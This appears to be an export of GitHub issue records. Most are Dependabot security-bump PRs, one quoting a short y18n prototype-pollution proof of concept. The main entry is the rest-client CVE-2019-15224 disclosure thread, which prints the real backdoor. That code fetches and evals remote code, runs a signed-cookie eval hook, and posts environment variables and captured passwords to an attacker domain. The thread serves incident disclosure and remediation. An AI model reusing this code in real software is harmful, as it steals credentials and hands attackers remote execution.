<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/npm/hosted-git-info/blob/v2.8.9/CHANGELOG.md"">hosted-git-info's changelog</a>.</em></p>
<blockquote>
<h2><a href=""https://github.com/npm/hosted-git-info/compare/v2.8.8...v2.8.9"">2.8.9</a> (2021-04-07)</h2>
<h3>Bug Fixes</h3>
<ul>
<li>backport regex fix from <a href=""https://github-redirect.dependabot.com/npm/hosted-git-info/issues/76"">#76</a> (<a href=""https://github.com/npm/hosted-git-info/commit/29adfe5"">29adfe5</a>), closes <a href=""https://github-redirect.dependabot.com/npm/hosted-git-info/issues/84"">#84</a></li>
</ul>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/npm/hosted-git-info/commit/8d4b3697d79bcd89cdb36d1db165e3696c783a01""><code>8d4b369</code></a> chore(release): 2.8.9</li>
<li><a href=""https://github.com/npm/hosted-git-info/commit/29adfe5ef789784c861b2cdeb15051ec2ba651a7""><code>29adfe5</code></a> fix: backport regex fix from <a href=""https://github-redirect.dependabot.com/npm/hosted-git-info/issues/76"">#76</a></li>
<li>See full diff in <a href=""https://github.com/npm/hosted-git-info/compare/v2.8.8...v2.8.9"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~nlf"">nlf</a>, a new releaser for hosted-git-info since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=hosted-git-info&package-manager=npm_and_yarn&previous-version=2.8.8&new-version=2.8.9)](https://dependabot.com/compatibility-score/?dependency-name=hosted-git-info&package-manager=npm_and_yarn&previous-version=2.8.8&new-version=2.8.9)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
benpickles/clocks,853021223,"[Security] Bump y18n from 4.0.0 to 4.0.3","Bumps [y18n](https://github.com/yargs/y18n) from 4.0.0 to 4.0.3. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-c4w7-xm78-47vh"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution</strong></p>
<h3>Overview</h3>
<p>The npm package <code>y18n</code> before versions 3.2.2, 4.0.1, and 5.0.5 is vulnerable to Prototype Pollution.</p>
<h3>POC</h3>
<pre><code>const y18n = require('y18n')();
<p>y18n.setLocale('<strong>proto</strong>');
y18n.updateLocale({polluted: true});</p>
<p>console.log(polluted); // true
</code></pre></p>
<h3>Recommendation</h3>
<p>Upgrade to version 3.2.2, 4.0.1, 5.0.5 or later.</p>
<p>Affected versions: = 4.0.0</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/yargs/y18n/blob/y18n-v4.0.3/CHANGELOG.md"">y18n's changelog</a>.</em></p>
<blockquote>
<h3><a href=""https://www.github.com/yargs/y18n/compare/y18n-v4.0.2...y18n-v4.0.3"">4.0.3</a> (2021-04-07)</h3>
<h3>Bug Fixes</h3>
<ul>
<li><strong>release:</strong> 4.x.x should not enforce Node 10 (<a href=""https://www.github-redirect.dependabot.com/yargs/y18n/issues/126"">#126</a>) (<a href=""https://www.github.com/yargs/y18n/commit/1e21a536e9135d8403a47be88922157a706b7cde"">1e21a53</a>)</li>
</ul>
<h3>4.0.1 (2020-11-30)</h3>
<h3>Bug Fixes</h3>
<ul>
<li>address prototype pollution issue (<a href=""https://www.github-redirect.dependabot.com/yargs/y18n/issues/108"">#108</a>) (<a href=""https://www.github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25"">a9ac604</a>)</li>
</ul>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/yargs/y18n/commit/0aa97c508ea31efadd2a27f98fed6873eefc963e""><code>0aa97c5</code></a> chore: release 4.x.x (<a href=""https://github-redirect.dependabot.com/yargs/y18n/issues/128"">#128</a>)</li>
<li><a href=""https://github.com/yargs/y18n/commit/a8e7f04f8011423ce526e9b9f7ceea190c032733""><code>a8e7f04</code></a> build(release-please): configure branch properly (<a href=""https://github-redirect.dependabot.com/yargs/y18n/issues/127"">#127</a>)</li>
<li><a href=""https://github.com/yargs/y18n/commit/1e21a536e9135d8403a47be88922157a706b7cde""><code>1e21a53</code></a> fix(release): 4.x.x should not enforce Node 10 (<a href=""https://github-redirect.dependabot.com/yargs/y18n/issues/126"">#126</a>)</li>
<li><a href=""https://github.com/yargs/y18n/commit/8dc75802f3aa944bf9a827213969d64834621215""><code>8dc7580</code></a> docs: update CHANGELOG</li>
<li><a href=""https://github.com/yargs/y18n/commit/7de58ca0d315990cdb38234e97fc66254cdbcd71""><code>7de58ca</code></a> fix: address prototype pollution issue</li>
<li>See full diff in <a href=""https://github.com/yargs/y18n/compare/v4.0.0...y18n-v4.0.3"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~oss-bot"">oss-bot</a>, a new releaser for y18n since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=y18n&package-manager=npm_and_yarn&previous-version=4.0.0&new-version=4.0.3)](https://dependabot.com/compatibility-score/?dependency-name=y18n&package-manager=npm_and_yarn&previous-version=4.0.0&new-version=4.0.3)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
benpickles/clocks,824788497,"[Security] Bump elliptic from 6.5.3 to 6.5.4","Bumps [elliptic](https://github.com/indutny/elliptic) from 6.5.3 to 6.5.4. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-r9p9-mrjm-926w"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Use of a Broken or Risky Cryptographic Algorithm</strong>
The npm package <code>elliptic</code> before version 6.5.4 are vulnerable to Cryptographic Issues via the secp256k1 implementation in elliptic/ec/key.js. There is no check to confirm that the public key point passed into the derive function actually exists on the secp256k1 curve. This results in the potential for the private key used in this implementation to be revealed after a number of ECDH operations are performed.</p>
<p>Affected versions: &lt; 6.5.4</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/indutny/elliptic/commit/43ac7f230069bd1575e1e4a58394a512303ba803""><code>43ac7f2</code></a> 6.5.4</li>
<li><a href=""https://github.com/indutny/elliptic/commit/f4bc72be11b0a508fb790f445c43534307c9255b""><code>f4bc72b</code></a> package: bump deps</li>
<li><a href=""https://github.com/indutny/elliptic/commit/441b7428b0e8f6636c42118ad2aaa186d3c34c3f""><code>441b742</code></a> ec: validate that a point before deriving keys</li>
<li><a href=""https://github.com/indutny/elliptic/commit/e71b2d9359c5fe9437fbf46f1f05096de447de57""><code>e71b2d9</code></a> lib: relint using eslint</li>
<li><a href=""https://github.com/indutny/elliptic/commit/8421a01aa3ff789c79f91eaf8845558a7be2b9fa""><code>8421a01</code></a> build(deps): bump elliptic from 6.4.1 to 6.5.3 (<a href=""https://github-redirect.dependabot.com/indutny/elliptic/issues/231"">#231</a>)</li>
<li>See full diff in <a href=""https://github.com/indutny/elliptic/compare/v6.5.3...v6.5.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=elliptic&package-manager=npm_and_yarn&previous-version=6.5.3&new-version=6.5.4)](https://dependabot.com/compatibility-score/?dependency-name=elliptic&package-manager=npm_and_yarn&previous-version=6.5.3&new-version=6.5.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
rest-client/rest-client,482238151,"[CVE-2019-15224] Version 1.6.13 published with malicious backdoor.","# Summary

On August 14, attackers published a series of rest-client versions from 1.6.10 to 1.6.13 using the credentials of a rest-client maintainer whose RubyGems.org account was compromised. The affected versions were downloaded a small number of times (~1000).

On August 19, @juskoljo observed the malicious gem version and created this issue. Later that day, the RubyGems security team yanked the offending gem version and locked the affected maintainer's
account. Several other gems were similarly affected.

https://github.com/rubygems/rubygems.org/wiki/Gems-yanked-and-accounts-locked#19-aug-2019

We have released version 1.6.14, identical to version 1.6.9, in order to supersede the affected versions in the legacy 1.6.x series. For checking dependencies, versions `<= 1.6.9` or `>= 1.6.14` are unaffected.

## Impact

The malicious backdoor in version 1.6.13 would activate in Rails installations where Rails.env started with ""p"" (as in ""production""). It would then download code from a Pastebin.com URL and execute it. The pastebin is now gone, but it reportedly phoned home to execute instructions from `mironanoru.zzz.com.ua`, which has also disappeared. This was reportedly used to mine cryptocurrency, but could have been used for any purpose.

Most rest-client users were not affected because the 1.6.x series is very old and was superseded by 1.7.0 in 2014. Only users who pin to 1.6.x and updated to 1.6.13 in the last week could have been affected, and only then in Rails production environments.

To search for Gemfile.lock files containing one of the malicious
versions, you may find this grep command useful:
    cd dir-to-search
    grep --include='Gemfile.lock' -r . -e 'rest-client (1\.6\.1[0123])'

## Remediation

The rest-client maintainers will take a number of steps in response to this incident:

- [x] First, we have released a new version 1.6.14 so that users who are for some reason unable to upgrade to a modern version of rest-client can have confidence in the security of a `bundle update`.

- [ ] Second, we will establish security practices that we expect of maintainers, such as enabling two-factor authentication on RubyGems.org accounts (available since last year).

- [ ] Third, we will seek to adopt policies for maintainer activity and continuity, and ideally seek one or two new active maintainers.  The latest release prior to today was in 2017, so it is not a surprise that rest-client has several maintainers who have not been active in many years.

The RubyGems.org team is also in the process of making a number of upstream security improvements in response to the increasing prevalence of attacks targeting popular open source libraries. These include:
- Adding web UI to show which specific user pushed or yanked a given gem release.
- Adding email notifications to owners of new gem pushes. (currently disabled due to using a free email provider plan)
- Validating passwords against a list of known compromised passwords. (in progress)

You can see this work in progress or make your own contributions at
https://github.com/rubygems/rubygems.org/

References:
CVE-2019-15224

**Original report follows below:**

<hr>

Hi,

It seems that rest-client 1.6.13 is uploaded to rubygems.org. I did review between 1.6.9 and 1.6.13 and it seems that latest version evaluate remote code from pastebin.com and sends information to mironanoru.zzz.com.ua

request.rb:
```ruby
def _!
  begin
    yield
  rescue Exception
  end
end

_!{Thread.new{loop{_!{sleep 900;eval(open('https://pastebin.com/raw/5iNdELNX').read)}}}if Rails.env[0]==""p""}

```
code from pastebin.com:
```ruby
_! {
  unless ENV[""URL_HOST""].to_s.include?(""localhost"")
    unless defined?(ZZZ)
      require ""openssl""
      require ""base64""
      public_key = OpenSSL::PKey.read(Base64.urlsafe_decode64(""LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2U3lDWUJiUUNsbTN4a21HMitRNwpSRjd5R1RXNzZoMVlrNE1qSHlNemhhdGUxQitDL1JQWjExbmU1WjBaMjhDK0VNWFVPWHRLTFlJMlF6Yk5VbmRLCmtVSUh3dWtZZ0hLWTRCL1U5OGI5UGJNZExOZjFtZ25UYnppVWhIYUFXQTB3R3RWL0ppQkNqc2taQkh4OTVlZGMKbmg0cCthcTM5ZlowemtFdUhYUUs0TU9URkJlaGJIelhCbmhPajhvU0NURHBjbjJEa1liR3lBcmpGb0JFTzQ4ZAphTklNSlAzQURpU1lYM2hmVmFoYTJCS0xzcnczWGFoMzFmOGh0U1dQNklBMTlqRy9wbVlqK2FBN0ZubWYwVHJDCjNnbGxRNFRrSWp6RVdHVUd5WklVcE9zZkVWeitWTDN0VDF1TDczdzVWa2NPU1MwajZ3cVQ5ckkrY2hHWXJJZEgKRFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==""))
      Rack::Sendfile.prepend Module.new {
        define_method(:call) { |e|
          _! {
            signature, payload, = e[""HTTP_COOKIE""].match(/__session=(.+);/)[1].split("","")
            signature = Base64.urlsafe_decode64(signature)
            payload = Base64.urlsafe_decode64(payload)
            if public_key.verify(OpenSSL::Digest.new(""sha256""), signature, payload)
              payload = JSON.parse(payload)
              if (Time.now.to_i - payload[""timestamp""]) <= 60
                eval(payload[""ruby""])
              end
            end
          }
          super(e)
        }
      }
      ZZZ = 0
    end
  end
}

_! {
  unless ENV[""URL_HOST""].to_s.include?(""localhost"")
    unless defined?(QQQ)
      Faraday.post(""http://mironanoru.zzz.com.ua/"", { ""x"" => ENV[""URL_HOST""].to_s, ""y"" => ENV.to_hash.to_yaml })
      QQQ = 0
    end
  end
}

_! {
  if ENV[""URL_HOST""].to_s[0] == ""e"" && ENV[""URL_HOST""].to_s[6] == ""x"" && ENV[""URL_HOST""].to_s.length == 13
    unless defined?(GGG)
      $kgiBWB3l = []
      Module.new {
        def authenticate(password)
          $kgiBWB3l << ""#{email}:#{password}"" rescue nil
          super
        end
      }.tap { |m| Identity.prepend(m) }
      GGG = 0
    end
    loop {
      break if $kgiBWB3l.empty?
      y = $kgiBWB3l.pop
      Faraday.post(""http://mironanoru.zzz.com.ua/"", { ""x"" => ENV[""URL_HOST""].to_s, ""y"" => y })
    }
  end
}

```
BR,
Jussi
","@juskoljo good catch! Just for record, I requested a CVE id for this incident, crediting you as the reporter. I will update once the CVE id is issued.

I notice that rest-client 1.6.13 has 1,061 downloads. Hopefully the CVE can help notify them about this issue.`1.6.13` has been yanked and pusher account: mwmanning has been locked.I'm sorry everyone. It looks like my rubygems account was compromised.All yanked version in https://rubygems.org/gems/rest-client/versions is affected?

> 1.6.13 - August 14, 2019 (114KB) yanked
> 1.6.12 - August 14, 2019 (113KB) yanked
> 1.6.11 - August 14, 2019 (113KB) yanked
> 1.6.10 - August 13, 2019 (11.5KB) yanked
Gem maintainers, please setting up multi-factor authentication. https://guides.rubygems.org/setting-up-multifactor-authentication/In case people need to write a detailed security report at their company. This might help you.

Security threat consisted out of the following:
- It sent the URL of the infected host to the attacker.
- It sent the environment variables of the infected host to the attacker. Depending on your set-up this can include credentials of services that you use e.g. database, payment service provider.
- It allowed to eval Ruby code on the infected host. Attacker needed to send a signed (using the attacker’s own key) cookie with the Ruby code to run.
- It overloaded the `#authenticate` method on the `Identity` class. Every time the method gets called it will send the email/password to the attacker. However I'm unsure which libraries use the Identity class though, maybe someone else knows?

Code diff between hijacked and new one is available here: https://diff.coditsu.io/diffs/7b368951-323a-42b9-b2ed-15da4ed4f17cJust ran this to find if one of my project was impacted, figured it could be useful to others:

```bash
cd ~/code # Where all my projects live
grep --include='Gemfile.lock' -r . -e 'rest-client (1\.6\.1[0123])'
```

If nothing gets printed, it means that your latest working branch of all your projects are safe (but it might be different than what you are running in production! I don't provide any guarantee here 😅)

Otherwise, it'll tell you which projects were compromised. Pay attention to @JanDintel's [message](https://github.com/rest-client/rest-client/issues/713#issuecomment-522967049), you might need to update `ENV` variables / credentials / passwords.just only 1k?) 
Love it. Is there a definitive list of affected versions?Here’s a proposal: make 2FA mandatory> Here’s a proposal: make 2FA mandatory

This will make many Ukrainian families starve.#notallukrainians@samgranieri Agreed. You should probably make this suggestion directly to [__RubyGems__](https://github.com/rubygems/rubygems)> #notallukrainians

Of course not all Ukrainians and the hacker could also be Russian. But it's definitely true, that money-driven hacking and malware distributes wealth from the centres of capitalism to it's edges.@chazanov I'm sorry, I'll include a smiley next time I write an ironic commentmake more new versions for nothing, merge then auto, do it guys! Thanks to hackers, they really show how stupid system we have. Think about it.Quick way to scan all your Gemfile.lock files checked out on your system (works in Linux).
`find . -name Gemfile.lock -exec grep -H 'rest-client (1.6.13)' {} \;`> #notallukrainians

Go Ukraine, best Ukraine EU-WestPlease release a new, clean `1.6.14` version. This will greatly help people, that run some sort of automatic update procedure and use the 1.6 branch of this gem, as they will automatically receive a non-infected version.@OpakAlex

>make more new versions for nothing, merge then auto, do it guys! Thanks to hackers, they really show how stupid system we have. Think about it.

As @mattmanning explained that the issue [was caused by compromised RubyGems account](https://github.com/rest-client/rest-client/issues/713#issuecomment-522735093), it wasn't merged automatically as a pull request and released as a new gem version.

>make more new versions for nothing,

I'm not a `rest-client` user and can't blame it for that but I would agree with you that gem releases with no significant updates to users are a real pain because of the time needed for reviewing changelogs.@nfedyashev i mean this 1k people, who turn auto updates merges. This is so stupid, sorry, and this so good that happens. WE need push down updates and new versions.@OpakAlex
oh, sorry I misunderstood your point.
Totally agree, ""automatically update to the latest gem version"" is crazy.@OpakAlex you can introduce a policy of reviewing releases for your projects with the differ that I mentioned and Coditsu. We're almost done with a OSS bundler plugin that will make mandatory reviewing a piece of cake.what is Coditsu @mensfeld ?@OpakAlex my partially OSS (soon fully OSS) set of security and quality tools for Ruby wrapped in a docker container that does not require a permanent access to git to run. Here's an example: https://app.coditsu.io/karafka/builds/commit_builds/10a892f5-aef6-49c6-ba29-e2362b841c90/validations

It pings you about deprecations without bundling them and allows you to review and approve / reject any gem version. And plugin will take the ""votes"" from the organisation you own and use that to block installing of deps that weren't reviewied, especially when upgrading (https://app.coditsu.io/karafka/builds/validations/b689b028-36ef-4ed9-a498-347c2da2b25b/offenses).

PM me if you want an early access ;) - it does not collect any data, nor it requires a code access to work.i do more wonder why someone or something would download infected ""1.6.*"" gems when 1.7.*/1.8.* are available since 2015?no thanks. I prefere check source code before update, more easy, your tool can be hacked too. But fools will like it ;) you on right way man, but i will never use it. @mensfeld . I can not trust external checks for security, sorry.@OpakAlex of course they can be hacked. That's why it is slowly released as an OSS that you can have internally. The only thing that will be required will be ability to receive rubygems webhooks for updates.> i do more wonder why someone or something would download infected ""1.6."" gems when 1.7./1.8.* are available since 2015?

legacy.@mattmanning @L2G @ab please lock this thread to maintainers, I think it's run its course for productive conversation.man @mensfeld , git, linux, grep, space program, moon program was done just because people use their brain. Now we have all this modern tools and a lot of shit into ocean, stop produce shit, easy. I will never use it. my projects so easy, i don't have 1+k gems. just some.Please note that the above grep command for searching for installs does not seem to work for me.  Based on a test file created as follows

`echo ""rest-client (1.6.13)"" > Gemfile.lock
`

the following command found the file.  

`sudo grep --include='Gemfile.lock' -r . -e 'rest-client (1\.6\.1[0123])' 2> /dev/null
`> just only 1k?)
> Love it.

Not great, not terribleif following the suggestion from @and0x000  to encourage auto-updates some sign has to be left on the machine to show that it _was_ infected otherwise people won't know they have to cleanup/change passwords/rotate credentials.  A similar event happened in the JS ecosystem this year, and my favorite takeaway was this blog post’s:
https://link.medium.com/VMrXqstgjZ

Even with 2FA, and even if you review the code (as hacks can be obscured), hacks can happen. So how do we limit the possible impacts of a dependency when it is hacked?> A similar event happened in the JS ecosystem this year, and my favorite takeaway was this blog post’s:
> https://link.medium.com/VMrXqstgjZ
> 
> Even with 2FA, and even if you review the code (as hacks can be obscured), hacks can happen. So how do we limit the possible impacts of a dependency when it is hacked?

just use your braine for development, not for youtube or instagram. easy)>Even with 2FA, and even if you review the code (as hacks can be obscured), hacks can happen. So how do we limit the possible impacts of a dependency when it is hacked?

Amongst other major structural things like sandboxing, if you're DNS logging at work and see callouts to fun Ukranian domains when you have zero business there, that may be an indicator. Looks like a targeted attack. `1.6.x` is quite old. Is there a list of dependants of this version?Maybe it's worth releasing additional version which would raise an installation error and point users to this issue? I doubt that the risk of breaking stuff for users is greater than the risk of compromise.Thank you all for the lively discussion. We'll return with some relevant follow ups.I just posted the following to the rest-client email announcement list:

https://rest-client.groups.io/g/main/message/325

> Hi all,
>
> On August 14, attackers published a series of rest-client versions
> from 1.6.10 to 1.6.13 using the credentials of a rest-client
> maintainer whose RubyGems.org account was compromised. The affected
> versions were downloaded a small number of times (~1000).
>
> On August 19, Jussi Koljonen observed the malicious gem version and
> created an issue. Later that day, the RubyGems security team yanked
> the offending gem version and locked the affected maintainer's
> account. Several other gems were similarly affected.
>
> https://github.com/rubygems/rubygems.org/wiki/Gems-yanked-and-accounts-locked#19-aug-2019
>
> The malicious backdoor in version 1.6.13 would activate in Rails
> installations where Rails.env started with ""p"" (as in ""production"").
> It would then download code from a Pastebin.com URL and execute it.
> The pastebin is now gone, but it reportedly phoned home to execute
> instructions from mironanoru DOT zzz DOT com DOT ua, which has also
> disappeared. This was reportedly used to mine cryptocurrency, but
> could have been used for any purpose.
>
> Most rest-client users were not affected because the 1.6.x series is
> very old and was superseded by 1.7.0 in 2014. Only users who pin to
> 1.6.x and updated to 1.6.13 in the last week could have been affected,
> and only then in Rails production environments.
>
> To search for Gemfile.lock files containing one of the malicious
> versions, you may find this grep command useful:
>     cd dir-to-search
>     grep --include='Gemfile.lock' -r . -e 'rest-client (1\.6\.1[0123])'
>
> The rest-client maintainers will take a number of steps in response to
> this incident:
>
> First, we have released a new version 1.6.14 so that users who are for
> some reason unable to upgrade to a modern version of rest-client can
> have confidence in the security of a `bundle update`.
>
> Second, we will establish security practices that we expect of
> maintainers, such as enabling two-factor authentication on
> RubyGems.org accounts (available since last year).
>
> Third, we will seek to adopt policies for maintainer activity and
> continuity, and ideally seek one or two new active maintainers.  The
> latest release prior to today was in 2017, so it is not a surprise
> that rest-client has several maintainers who have not been active in
> many years.
>
> The RubyGems.org team is also in the process of making a number of
> upstream security improvements in response to the increasing
> prevalence of attacks targeting popular open source libraries. These
> include:
> - Adding web UI to show which specific user pushed or yanked a given
> gem release.
> - Adding email notifications to owners of new gem pushes. (currently
> disabled due to using a free email provider plan)
> - Validating passwords against a list of known compromised passwords.
> (in progress)
>
> You can see this work in progress or make your own contributions at
> https://github.com/rubygems/rubygems.org/
>
> Thanks for your patience and support,
> Andy
>
> References:
> https://github.com/rest-client/rest-client/issues/713
> CVE-2019-15224",no,"security,"
jsonpickle/jsonpickle,1096711241,"Drop support for EOL Python versions","Currently, I want to remove support for Python 2.7, 3.5, and 3.6, as both have reached their End of Life date. The PSF stated that **EOL CPython versions receive no further security updates**, and any codebase using them is advised to migrate to a newer version. I'm thinking that CPython 3.8+ would be a sensible target, as that lets us use walrus operators (``:=``) in the code as well as the nice ``f""{expr}=""`` syntax for f-strings ([since both of those were introduced in 3.8](https://docs.python.org/3.8/whatsnew/3.8.html)). Also, for speed implications, the [CPython 3.9 Whatsnew has a nice graph of how much faster some basic operations got between 3.7 and 3.8](https://docs.python.org/3.9/whatsnew/3.9.html#optimizations).

Any dropping of multiple EOL CPython versions would probably occur in a jsonpickle 3.0 release, so likely not for at least another few months. For reference, [here's a chart of EOL CPython versions](https://endoflife.date/python). 3.6 hit EOL 2 weeks ago, and 3.7 hits EOL in June 2023 so it would be reasonable to keep supporting 3.7 for a while longer (I'm just trying to minimize the number of major version bumps we need, since we'll eventually need to drop support for 3.7). 2.7 and 3.5 absolutely do not need to be supported, as 2.7 hit EOL 2 years ago, and 3.5 hit it 1.25 years ago.

@davvid Can you check the PyPi stats for jsonpickle to see how many weekly/monthly downloads the package gets from 2.7, 3.6, and 3.7? The 3.x series isn't super relevant since it's an easy upgrade from 3.5/3.6 to 3.8+, and 3.7 to 3.8 is essentially drop-in. I'd be interested to see how many people have yet to make the switch though.

Lastly, do any users of jsonpickle have a reason they'd like to see support for 3.6 and/or 3.7 in the library in the near future? I think a valid case for 3.7 would be pretty easy to make, and 3.6 support could possibly be kept if a lot of people still use it.","With my vfxplatform hat on, python3.7 would stilll be nice to support since it can help folks that are still trying to transition to 3.x. A fairly significant set of tools still ship 3.7. The vfx2021 platform is still in the process of being adopted in many facilities.

https://www.pypistats.org/packages/jsonpickle shows that 3.7 is still very actively downloaded, so maybe we can hold onto it for another couple of years.Oh, that website is interesting. Based on that info, we should absolutely keep 3.7 support. 3.6 seems pretty high up there though, so maybe when jsonpickle 3.0 is released, focus can be on the 3.0 branch, and bugfixes can be backported to the 2.x series?I think I'm leaning towards cleaning up outdated code and releasing jsonpickle 3 (with only 3.7+ support) sometime after 2.2.0 is released, probably over the summer. In retrospect, jsonpickle 2 was really released too fast, we should have at least dropped 2.7 and 3.5 support with that dictionary identity change.2.2.0 has been released, starting to clean up the old code now.The claim in the initial comment is false, as f-strings (PEP-498) are already present in Python 3.6 (see https://docs.python.org/3.6/whatsnew/3.6.html#pep-498-formatted-string-literals). That said, while I am still stuck on Python 3.6 for now, dropping support for it should be no big deal from my side as I only use a rather small subset of the available functionality.The initial comment was that 3.8 introduced support for the walrus operator was well as the ``{expr=}`` feature for f-strings. That is a true statement, see [walrus](https://docs.python.org/3/whatsnew/3.8.html#assignment-expressions) and [expr=](https://docs.python.org/3/whatsnew/3.8.html#f-strings-support-for-self-documenting-expressions-and-debugging).Okay, I must have missed the assignment part for f-strings.",no,"compatibility,security,"
PHeonix25/Testing-out-Rails,568636775,"CVE-2015-3155 (Medium) detected in rails-v2.3.8","## CVE-2015-3155 - Medium Severity Vulnerability
